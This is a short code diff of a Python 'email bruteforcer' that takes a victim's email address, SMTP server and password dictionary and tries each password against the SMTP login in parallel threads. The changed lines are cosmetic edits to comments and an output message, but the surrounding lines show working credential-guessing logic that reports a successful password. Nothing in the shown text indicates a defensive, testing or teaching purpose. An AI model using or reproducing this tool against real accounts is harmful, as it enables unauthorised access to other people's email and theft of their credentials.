@@ -11,7 +11,7 @@ import os
 import argparse
 import threading
 
-
+#Retreive arguments from Cli
 parser = argparse.ArgumentParser(description='Simple email bruteforcer')
 parser.add_argument('-v','--victim-email', help='Specify the victims email', required=True)
 parser.add_argument('-s','--victim-smtp', help='Set the victims smtp server (exemple: smtp.mail.ru)', required=True)
@@ -25,7 +25,7 @@ port = args['smtp_port']
 dict_brut = args['dictionnary']
 
 
-#Process for MultiThread
+#Process for MultiThreading
 def try_password(password, smtp_server, port, victim_mail):
     passwd = password.rstrip()
     print("[*] try password: {} ".format(passwd))
@@ -34,7 +34,7 @@ def try_password(password, smtp_server, port, victim_mail):
         smtp.ehlo()
         answer, status  = smtp.login(victim_mail, passwd)
         if status == b'Authentication succeeded':
-            print("\n[+] Cool Password Found: {}".format(passwd))
+            print("\n[+] Password Found: {}".format(passwd))
             sys.exit(0)
         else:
             raise ConnectionResetError
